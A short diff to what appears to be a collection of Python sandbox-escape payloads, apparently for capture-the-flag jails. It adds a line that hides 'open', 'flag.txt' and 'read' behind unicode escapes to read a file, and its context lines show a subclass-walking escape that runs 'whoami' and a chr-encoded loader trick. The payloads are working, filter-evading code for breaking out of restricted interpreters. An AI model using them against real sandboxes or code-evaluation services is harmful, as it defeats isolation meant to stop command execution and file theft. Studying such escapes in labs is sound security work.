@@ -48,6 +48,8 @@ print(cls(['cmd','/c','whoami'],stdout=-1).communicate()[0])
 
 FileLoader + chr
 
+open_str='\u006f\u0070\u0065\u006e';open_func=escape.get_function(open_str);filename='\u0066\u006c\u0061\u0067\u002e\u0074\u0078\u0074';mode='\u0072';read_str='\u0072\u0065\u0061\u0064';fo=open_func(filename,mode);rd_func=getattr(fo,read_str);print(rd_func())
+
 fn=''.join(map(chr,[102,108,97,103,46,116,120,116]))
 loader=(().__class__.__bases__[0].__subclasses__()[122])('.',fn)
 method=''.join(map(chr,[103,101,116,95,100,97,116,97]))
